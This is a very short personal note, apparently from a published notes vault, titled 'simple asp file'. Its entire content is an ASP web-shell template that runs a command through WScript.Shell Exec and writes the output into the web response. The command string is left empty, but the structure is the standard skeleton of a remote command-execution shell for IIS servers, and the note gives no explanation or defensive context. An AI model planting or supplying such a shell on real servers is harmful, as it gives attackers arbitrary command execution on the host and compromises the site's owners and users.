---
publish: true
created: 2026-02-26T13:59:22.270+05:30
modified: 2026-06-22T08:49:54.318+05:30
---

simple asp file

```asp
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```
